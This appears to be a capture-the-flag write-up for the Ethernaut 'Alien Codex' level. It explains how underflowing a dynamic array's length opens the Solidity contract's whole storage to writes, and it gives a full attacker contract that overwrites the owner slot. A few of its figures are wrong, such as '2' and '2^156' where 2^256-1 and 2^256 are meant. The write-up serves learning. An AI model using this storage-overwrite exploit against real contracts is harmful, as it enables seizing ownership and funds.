# Level 19 : Alien Codex

We can see in the above contract that there's no `owner` variable. This is because it is coming from the inherited `Ownable` contract. If we look into the `Ownable.sol`, we can see that the variable `address private _owner;` is defined in the slot 0 of the contract.

The key point here is to understand how dynamic arrays work : 

- If dynamic array starts at a slot position p, then the slot p will contain the total number of elements stored in the array.
- The actual array data will be stored at `keccack256(p)`
    - At keccak256(1) ⇒ codex[0], keccak256(2) ⇒ codex[1] etc.. until 2^256-1⇒codex[2^156-1-uint(keccak256(1))] **and after that we have slot 0 ⇒ codex[2^256 -1-uint(keccack256(1))+1]**

To finish the level we need to do the following steps:

1. Call the **`make_contact()`** function so that the **`contact`** is set to **`true`**. This will allow us to go through the **`contacted()`** modifier.
2. Call the **`retract()`** function. This will decrease the **`codex.length`** by 1. And what happens when you subtract 1 from 0 (initial array position)? You get an underflow. This will change the **`codex.length`** to be 2 which is also the total storage capacity of the contract. This will now allow us access to any variables stored in the contract.
3. Call the **`revise()`** function to access the array at slot 0 and update the value of the **`_owner`** with our own address. The index **`i`** can be calculated as shown in the slot table above.
    1. `uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;` 
        
        ⇒35707666377435648211887908874984608119992236509074197713628505308453184860938
        
    2. Argument of revise function is in bytes32 so : `bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));`
        
        ⇒ 0x000000000000000000000000c749870fa970eaec3ad0d556800078c61b603ed6
        

## **Takeaways**

**Never allow modification of the array length of a dynamic array as they can overwrite the whole contract's storage using overflows and underflows.**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract level19Hack{
    uint public index;
    bytes32 public myAddress;
    AlienCodex toHack = AlienCodex(0xA88a73C92969aeaa0f237fBAa68cb3e48cEd0268);
    function level19() public{
        index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        myAddress = bytes32(uint256(uint160(address(0xC749870fa970EaeC3Ad0D556800078C61b603eD6))));
        toHack.make_contact();
        toHack.retract();
        toHack.revise(index,myAddress);
    }
}

contract AlienCodex { // remove the ownable.sol for facility
  .....
}
```